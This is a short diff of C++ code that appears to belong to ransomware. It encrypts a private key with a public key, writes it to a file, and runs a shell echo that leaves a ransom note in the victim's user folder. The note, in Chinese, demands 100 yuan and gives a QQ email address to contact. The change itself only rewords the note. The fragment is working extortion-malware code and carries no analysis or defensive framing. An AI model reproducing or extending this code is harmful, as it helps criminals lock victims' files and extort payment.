@@ -121,7 +121,7 @@ int main(int argc,char *argv[])
             fuckEn.setpubkey((char *)&pubkey[0]);
             string a = fuckEn.encryptData(fuck.getPrikey());
             ofs.write((char *)&a[0], a.size());
-            string o = "echo 想恢复文件？联系1006966418@qq.com!将recover.data发给我。你需要准备100元人民币。>C:\\Users\\" + (string)getUsers() + "\\readme.txt";
+            string o = "echo 想要恢复文件？联系1006966418@qq.com!将recover.data发给我。你需要准备100元人民币。>C:\\Users\\" + (string)getUsers() + "\\readme.txt";
             system((char *)&o[0]);
             return 0;
         }
